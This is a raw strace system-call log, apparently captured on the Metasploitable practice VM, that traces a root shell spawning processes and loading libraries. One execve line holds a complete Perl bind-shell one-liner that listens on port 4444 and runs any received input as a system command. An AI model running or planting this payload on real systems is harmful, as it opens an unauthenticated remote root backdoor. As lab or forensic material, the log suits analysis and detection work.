7693  07:19:58.033323 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 1
7693  07:19:58.033337 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30\0\0004\0\0\0\254\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\330\206\0\0\330\206\0\0\330\206\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240\213\0\0\240\213\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0\314\1\0\0\260\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0k\0\0\0.\0\0\0\20\0\0\0\t\0\0\0\"F\340\24\240\240\245\1\31\10\200\20\203\6\212\10\0\0\222@]\1(\nx\10 \"\220\200\20,\5\1\204\4)!\0224\0\24\0\31\0\0\2\2\210@\0\200@0\210\201@@\200\0B\0\6\300.\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0002\0\0\0003\0\0\0\0\0\0\0004\0\0\0\0\0\0\0005\0\0\0007\0\0\0008\0\0\0\0\0\0\0:\0\0\0\0\0\0\0;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
7693  07:19:58.033427 fstat64(1, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
7693  07:19:58.033444 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d7c000
7693  07:19:58.033455 mmap2(0xb7d85000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7d85000
7693  07:19:58.033472 close(1)          = 0
7693  07:19:58.033493 munmap(0xb7f37000, 29913) = 0
7693  07:19:58.033509 open("/etc/passwd", O_RDONLY|0x80000 /* O_??? */) = 1
7693  07:19:58.033523 fcntl64(1, F_GETFD) = 0x1 (flags FD_CLOEXEC)
7693  07:19:58.033535 _llseek(1, 0, [0], SEEK_CUR) = 0
7693  07:19:58.033546 fstat64(1, {st_mode=S_IFREG|0644, st_size=1624, ...}) = 0
7693  07:19:58.033563 mmap2(NULL, 1624, PROT_READ, MAP_SHARED, 1, 0) = 0xb7f3e000
7693  07:19:58.033601 _llseek(1, 1624, [1624], SEEK_SET) = 0
7693  07:19:58.033631 munmap(0xb7f3e000, 1624) = 0
7693  07:19:58.033641 close(1)          = 0
7693  07:19:58.033670 getpgrp()         = 3831
7693  07:19:58.033680 rt_sigaction(SIGCHLD, {0x807e540, [], 0}, {SIG_DFL}, 8) = 0
7693  07:19:58.033695 getrlimit(RLIMIT_NPROC, {rlim_cur=8191, rlim_max=8191}) = 0
7693  07:19:58.033711 brk(0x8101000)    = 0x8101000
7693  07:19:58.033742 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
7693  07:19:58.033756 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
7693  07:19:58.033771 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
7693  07:19:58.033808 brk(0x8102000)    = 0x8102000
7693  07:19:58.033834 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
7693  07:19:58.033853 stat64("/sbin/AB", 0xbfc35288) = -1 ENOENT (No such file or directory)
7693  07:19:58.033865 stat64("/bin/AB", 0xbfc35288) = -1 ENOENT (No such file or directory)
7693  07:19:58.033876 stat64("/usr/sbin/AB", 0xbfc35288) = -1 ENOENT (No such file or directory)
7693  07:19:58.033888 stat64("/usr/bin/AB", 0xbfc35288) = -1 ENOENT (No such file or directory)
7693  07:19:58.033906 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
7693  07:19:58.033920 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7db26f8) = 7694
7694  07:19:58.033965 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
7694  07:19:58.033981 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
7694  07:19:58.033994 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
7694  07:19:58.034006 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
7694  07:19:58.034021 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
7694  07:19:58.034037 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
7694  07:19:58.034050 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
7694  07:19:58.034149 write(2, "sh: AB: command not found\n", 26) = -1 EPIPE (Broken pipe)
7694  07:19:58.034164 --- SIGPIPE (Broken pipe) @ 0 (0) ---
7694  07:19:58.034232 exit_group(127)   = ?
7693  07:19:58.049483 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
7693  07:19:58.049483 --- SIGCHLD (Child exited) @ 0 (0) ---
7693  07:19:58.049484 waitpid(-1, [{WIFEXITED(s) && WEXITSTATUS(s) == 127}], WNOHANG) = 7694
7693  07:19:58.049484 waitpid(-1, 0xbfc34f08, WNOHANG) = -1 ECHILD (No child processes)
7693  07:19:58.049484 sigreturn()       = ? (mask now [])
7693  07:19:58.049484 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
7693  07:19:58.049485 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
7693  07:19:58.049485 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
7693  07:19:58.049485 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_DFL}, 8) = 0
7693  07:19:58.049485 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
7693  07:19:58.049485 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
7693  07:19:58.049486 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
7693  07:19:58.049486 stat64("/sbin/perl", 0xbfc352b8) = -1 ENOENT (No such file or directory)
7693  07:19:58.049486 stat64("/bin/perl", 0xbfc352b8) = -1 ENOENT (No such file or directory)
7693  07:19:58.049486 stat64("/usr/sbin/perl", 0xbfc352b8) = -1 ENOENT (No such file or directory)
7693  07:19:58.049494 stat64("/usr/bin/perl", {st_mode=S_IFREG|0755, st_size=1080724, ...}) = 0
7693  07:19:58.049512 stat64("/usr/bin/perl", {st_mode=S_IFREG|0755, st_size=1080724, ...}) = 0
7693  07:19:58.049537 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
7693  07:19:58.049564 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7db26f8) = 7695
4519  07:19:58.049609 waitpid(7693,  <unfinished ...>
7695  07:19:58.069870 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
7695  07:19:58.069995 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
7695  07:19:58.070055 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
7695  07:19:58.070090 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
7695  07:19:58.070120 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
7695  07:19:58.070148 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
7695  07:19:58.070163 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
7695  07:19:58.070199 execve("/usr/bin/perl", ["perl", "-MIO", "-e", "$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};"], [/* 14 vars */]) = 0
7695  07:19:58.070327 brk(0)            = 0x8153000
7695  07:19:58.070363 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
7695  07:19:58.070380 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f99000
7695  07:19:58.070396 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
7695  07:19:58.070412 open("/etc/ld.so.cache", O_RDONLY) = 1
7695  07:19:58.070425 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
7695  07:19:58.070442 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f91000
7695  07:19:58.070453 close(1)          = 0
7695  07:19:58.070464 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
7695  07:19:58.070484 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
7695  07:19:58.070499 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
7695  07:19:58.070591 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
7695  07:19:58.070609 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f8d000
7695  07:19:58.070621 mmap2(0xb7f8f000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7f8f000
7695  07:19:58.070637 close(1)          = 0
7695  07:19:58.070648 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
7695  07:19:58.070662 open("/lib/tls/i686/cmov/libm.so.6", O_RDONLY) = 1
7695  07:19:58.070677 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@4\0\0004\0\0\0PB\2\0\0\0\0\0004\0 \0\t\0(\0 \0\37\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0x\20\2\0x\20\2\0x\20\2\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0$/\2\0$/\2\0\5\0\0\0\0\20\0\0\1\0\0\0\334>\2\0\334>\2\0\334>\2\0`\1\0\0\244\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360>\2\0\360>\2\0\360>\2\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\214\20\2\0\214\20\2\0\214\20\2\0\34\4\0\0\34\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334>\2\0\334>\2\0\334>\2\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\214\2\0\0\17\0\0\0@\0\0\0\v\0\0\0%\220 \305\t\204g\v\0\302\20 \4iER\202\20\200\240\0}\210\272\10\10I\0\0\0\0\0\33\4\201\0\0\0\232U\20A P \200\224\202\220\21@\3722\0\304a\24\0\10\6\306\220\232\f\207\300 \250\0  \202\0\230\201\4E\7\0054a\2\0\0\251C\30\310 \10\23\30\24M8\"\0\22\24\21@T\203\2E\1\1\1\244\fX\20\0\210\2\0 \0@\0$\214\5\10", 512) = 512
7695  07:19:58.070777 fstat64(1, {st_mode=S_IFREG|0644, st_size=149328, ...}) = 0
7695  07:19:58.070795 mmap2(NULL, 147584, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f68000
7695  07:19:58.070806 mmap2(0xb7f8b000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x23) = 0xb7f8b000
7695  07:19:58.070822 close(1)          = 0
7695  07:19:58.070834 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
7695  07:19:58.070848 open("/lib/tls/i686/cmov/libpthread.so.0", O_RDONLY) = 1
7695  07:19:58.070862 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20H\0\0004\0\0\0\330C\1\0\0\0\0\0004\0 \0\t\0(\0$\0!\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\224\n\1\0\224\n\1\0\224\n\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4;\1\0\4;\1\0\5\0\0\0\0\20\0\0\1\0\0\0\344=\1\0\344M\1\0\344M\1\0T\3\0\0\374#\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\250\n\1\0\250\n\1\0\250\n\1\0\314\4\0\0\314\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\344=\1\0\344M\1\0\344M\1\0\20\2\0\0\20\2\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\262\1\0\0L\0\0\0@\0\0\0\v\0\0\0\31!\2\221\1\n\20\"@H \331\3\0I4\200\0\0@\0 \200\200\21P`@@\22\213\0020D\0\0\20\0\0\2\0\1\r\0\204\n\360\1X\260\r\240\200\10 $\204\20B\242)m\10G\234V\20\0\224 \204$\10\0H(\1\222\34\301B\240\220\22\10\f \2\30`A\244c\4\0\n\32\3\0\0)\0(\314@\204\210L\22\10\241\0\4\0\10\0\300Q\0\2009\4C\300", 512) = 512
7695  07:19:58.070953 fstat64(1, {st_mode=S_IFREG|0755, st_size=112354, ...}) = 0
7695  07:19:58.070969 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f67000
7695  07:19:58.070982 mmap2(NULL, 94688, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f4f000
7695  07:19:58.070993 mmap2(0xb7f63000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7f63000
7695  07:19:58.071007 mmap2(0xb7f65000, 4576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7f65000
7695  07:19:58.071021 close(1)          = 0
7695  07:19:58.071033 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
7695  07:19:58.071046 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
7695  07:19:58.071060 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
7695  07:19:58.071149 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
7695  07:19:58.071167 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7e00000
7695  07:19:58.071178 mmap2(0xb7f49000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7f49000
7695  07:19:58.071192 mmap2(0xb7f4c000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7f4c000
7695  07:19:58.071205 close(1)          = 0
7695  07:19:58.071217 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
7695  07:19:58.071230 open("/lib/tls/i686/cmov/libcrypt.so.1", O_RDONLY) = 1
7695  07:19:58.071244 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\7\0\0004\0\0\0<\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340\210\0\0\340\210\0\0\340\210\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\f\212\0\0\f\212\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0`\1\0\0tr\2\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\17\0\0\0\22\0\0\0\2\0\0\0\6\0\0\0\4\311\240, \4\0\0\0\0\0\0\0\0\0\0\0\0\0\0\22\0\0\0\23\0\0\0\24\0\0\0\0\0\0\0\25\0\0\0\26\0\0\0\0\0\0\0\27\0\0\0\0\0\0\0\30\0\0\0\31\0\0\0\0\0\0\0k\31Qj\233(\375B\233`\205\33\327\16?\17I->\333\235C\r\375\313\373_\22\325=l\366\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0o\0\0\0\0\0\0\0\35\0\0\0\22\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0 \0\0\0\37\0\0\0\0\0\0\0", 512) = 512
7695  07:19:58.071381 fstat64(1, {st_mode=S_IFREG|0644, st_size=38300, ...}) = 0
7695  07:19:58.071398 mmap2(NULL, 201052, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7dce000
7695  07:19:58.071409 mmap2(0xb7dd7000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7dd7000
7695  07:19:58.071424 mmap2(0xb7dd9000, 155996, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7dd9000
7695  07:19:58.071438 close(1)          = 0
7695  07:19:58.071462 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7dcd000
7695  07:19:58.071474 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7dcd8c0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
7695  07:19:58.071533 mprotect(0xb7f49000, 4096, PROT_READ) = 0
7695  07:19:58.071559 munmap(0xb7f91000, 29913) = 0
7695  07:19:58.071572 set_tid_address(0xb7dcd908) = 7695
7695  07:19:58.071582 set_robust_list(0xb7dcd910, 0xc) = 0
7695  07:19:58.071591 futex(0xbffa1440, 0x81 /* FUTEX_??? */, 1) = 0
7695  07:19:58.071607 rt_sigaction(SIGRTMIN, {0xb7f532c0, [], SA_SIGINFO}, NULL, 8) = 0
7695  07:19:58.071620 rt_sigaction(SIGRT_1, {0xb7f53340, [], SA_RESTART|SA_SIGINFO}, NULL, 8) = 0
7695  07:19:58.071632 rt_sigprocmask(SIG_UNBLOCK, [RTMIN RT_1], NULL, 8) = 0
7695  07:19:58.071646 getrlimit(RLIMIT_STACK, {rlim_cur=8192*1024, rlim_max=RLIM_INFINITY}) = 0
7695  07:19:58.071665 uname({sys="Linux", node="metasploitable", ...}) = 0
7695  07:19:58.071711 rt_sigaction(SIGFPE, {SIG_IGN}, {SIG_DFL}, 8) = 0
7695  07:19:58.071765 brk(0)            = 0x8153000
7695  07:19:58.071776 brk(0x8174000)    = 0x8174000
7695  07:19:58.071822 getuid32()        = 0
7695  07:19:58.071832 geteuid32()       = 0
7695  07:19:58.071841 getgid32()        = 0
7695  07:19:58.071850 getegid32()       = 0
7695  07:19:58.071886 mmap2(NULL, 135168, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7dac000
7695  07:19:58.071912 open("/dev/urandom", O_RDONLY|O_LARGEFILE) = 1
7695  07:19:58.071929 read(1, "G\237\32\322", 4) = 4
7695  07:19:58.071942 close(1)          = 0
7695  07:19:58.071960 time(NULL)        = 1495624798
7695  07:19:58.072001 stat64("/usr/local/lib/site_perl/5.8.8/i486-linux-gnu-thread-multi", 0xbffa1110) = -1 ENOENT (No such file or directory)
7695  07:19:58.072018 stat64("/usr/local/lib/site_perl/5.8.8", 0xbffa1110) = -1 ENOENT (No such file or directory)
7695  07:19:58.072031 stat64("/usr/local/lib/site_perl/i486-linux-gnu-thread-multi", 0xbffa1110) = -1 ENOENT (No such file or directory)
7695  07:19:58.072047 stat64("/usr/local/lib/perl/5.8.7", 0xbffa1250) = -1 ENOENT (No such file or directory)
7695  07:19:58.072059 stat64("/usr/local/share/perl/5.8.7", 0xbffa1250) = -1 ENOENT (No such file or directory)
7695  07:19:58.072071 stat64("/usr/local/lib/perl/5.8.6", 0xbffa1250) = -1 ENOENT (No such file or directory)
7695  07:19:58.072082 stat64("/usr/local/share/perl/5.8.6", 0xbffa1250) = -1 ENOENT (No such file or directory)
7695  07:19:58.072094 stat64("/usr/local/lib/perl/5.8.4", 0xbffa1250) = -1 ENOENT (No such file or directory)
7695  07:19:58.072106 stat64("/usr/local/share/perl/5.8.4", 0xbffa1250) = -1 ENOENT (No such file or directory)
7695  07:19:58.072117 stat64("/usr/local/lib/perl/5.8.3", 0xbffa1250) = -1 ENOENT (No such file or directory)
7695  07:19:58.072129 stat64("/usr/local/share/perl/5.8.3", 0xbffa1250) = -1 ENOENT (No such file or directory)
7695  07:19:58.072140 stat64("/usr/local/lib/perl/5.8.2", 0xbffa1250) = -1 ENOENT (No such file or directory)
7695  07:19:58.072152 stat64("/usr/local/share/perl/5.8.2", 0xbffa1250) = -1 ENOENT (No such file or directory)
7695  07:19:58.072163 stat64("/usr/local/lib/perl/5.8.1", 0xbffa1250) = -1 ENOENT (No such file or directory)
7695  07:19:58.072175 stat64("/usr/local/share/perl/5.8.1", 0xbffa1250) = -1 ENOENT (No such file or directory)
7695  07:19:58.072190 stat64("/usr/local/lib/perl/5.8.0", 0xbffa1250) = -1 ENOENT (No such file or directory)
7695  07:19:58.072201 stat64("/usr/local/share/perl/5.8.0", 0xbffa1250) = -1 ENOENT (No such file or directory)
7695  07:19:58.072224 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa0f48) = -1 ENOTTY (Inappropriate ioctl for device)
7695  07:19:58.072237 _llseek(0, 0, [0], SEEK_CUR) = 0
7695  07:19:58.072259 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa0f48) = -1 EBADF (Bad file descriptor)
7695  07:19:58.072271 _llseek(1, 0, 0xbffa0f90, SEEK_CUR) = -1 EBADF (Bad file descriptor)
7695  07:19:58.072281 ioctl(2, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa0f48) = -1 EINVAL (Invalid argument)
7695  07:19:58.072292 _llseek(2, 0, 0xbffa0f90, SEEK_CUR) = -1 ESPIPE (Illegal seek)
7695  07:19:58.072303 open("/dev/null", O_RDONLY|O_LARGEFILE) = 1
7695  07:19:58.072315 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa1008) = -1 ENOTTY (Inappropriate ioctl for device)
7695  07:19:58.072326 _llseek(1, 0, [0], SEEK_CUR) = 0
7695  07:19:58.072337 fcntl64(1, F_SETFD, FD_CLOEXEC) = 0
7695  07:19:58.072348 fstat64(1, {st_mode=S_IFCHR|0666, st_rdev=makedev(1, 3), ...}) = 0
7695  07:19:58.072367 rt_sigaction(SIGCHLD, NULL, {SIG_DFL}, 8) = 0
7695  07:19:58.072421 readlink("/proc/self/exe", "/usr/bin/perl", 4095) = 13
7695  07:19:58.072466 getppid()         = 7693
7695  07:19:58.072526 stat64("/etc/perl/IO.pmc", 0xbffa0cfc) = -1 ENOENT (No such file or directory)
7695  07:19:58.072540 stat64("/etc/perl/IO.pm", 0xbffa0c0c) = -1 ENOENT (No such file or directory)
7695  07:19:58.072553 stat64("/usr/local/lib/perl/5.8.8/IO.pmc", 0xbffa0cfc) = -1 ENOENT (No such file or directory)
7695  07:19:58.072565 stat64("/usr/local/lib/perl/5.8.8/IO.pm", 0xbffa0c0c) = -1 ENOENT (No such file or directory)
